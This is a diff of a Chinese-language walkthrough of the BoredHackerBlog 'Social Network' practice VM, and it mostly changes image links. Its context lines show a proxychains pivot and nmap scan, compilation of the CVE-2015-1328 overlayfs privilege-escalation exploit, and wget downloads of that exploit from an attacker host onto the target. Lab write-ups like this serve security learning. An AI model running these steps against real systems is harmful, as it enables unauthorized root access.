@@ -1,4 +1,3 @@
-
 >**Name:** BoredHackerBlog: Social Network
 >
 >**Date release:** 29 Mar 2020
@@ -339,11 +338,11 @@ socks 1080
 sudo vi /etc/proxychains4.conf 
 ```
 
-![image-20210918111302194](C:/Users/52307/AppData/Roaming/Typora/typora-user-images/image-20210918111302194.png)
+![image-20210918111302194](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918111302194.png)
 
 对应上一步设置的socks5代理和端口，将其修改匹配
 
-![image-20210918111415145](C:/Users/52307/AppData/Roaming/Typora/typora-user-images/image-20210918111415145.png)
+![image-20210918111415145](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918111415145.png)
 
 
 
@@ -359,7 +358,7 @@ sudo vi /etc/proxychains4.conf
 proxychains nmap -Pn -sT 172.17.0.1
 ```
 
-![image-20210918111604295](C:/Users/52307/AppData/Roaming/Typora/typora-user-images/image-20210918111604295.png)
+![image-20210918111604295](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918111604295.png)
 
 进一步扫描端口服务信息
 
@@ -573,11 +572,11 @@ gcc
 
 解决办法：修改源代码，**删除调用库文件的代码**
 
-![image-20210918121534221](C:/Users/52307/AppData/Roaming/Typora/typora-user-images/image-20210918121534221.png)
+![image-20210918121534221](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121534221.png)
 
 最终代码如下：
 
-![image-20210918121641513](C:/Users/52307/AppData/Roaming/Typora/typora-user-images/image-20210918121641513.png)
+![image-20210918121641513](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121641513.png)
 
 #### 5.4漏洞利用
 
@@ -587,7 +586,7 @@ gcc编译
 gcc -o exp 37292.c
 ```
 
-![image-20210918121714255](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918121714255.png)
+![image-20210918121714255](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121714255.png)
 
 编译过程中报错，但**不影响最终执行结果**
 
@@ -597,7 +596,7 @@ gcc -o exp 37292.c
 ls -l
 ```
 
-![image-20210918121816991](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918121816991.png)
+![image-20210918121816991](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121816991.png)
 
 配合exp执行使用还需要二进制的库文件**ofs-lib.so**，定位查找该文件路径
 
@@ -605,7 +604,7 @@ ls -l
 locate ofs-lib.so
 ```
 
-![image-20210918122041377](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918122041377.png)
+![image-20210918122041377](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122041377.png)
 
 拷贝至当前目录
 
@@ -617,7 +616,7 @@ cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .
 ls
 ```
 
-![image-20210918122314167](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918122314167.png)
+![image-20210918122314167](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122314167.png)
 
 两个文件都在当前目录下
 
@@ -627,7 +626,7 @@ ls
 python3 -m http.server 80
 ```
 
-![image-20210918122427173](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918122427173.png)
+![image-20210918122427173](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122427173.png)
 
 下载文件
 
@@ -639,7 +638,7 @@ wget http://10.0.2.4/exp
 wget http://10.0.2.4/ofs-lib.so
 ```
 
-![image-20210918122710747](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918122710747.png)
+![image-20210918122710747](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122710747.png)
 
 拷贝到目标靶机的/tmp目录下
 
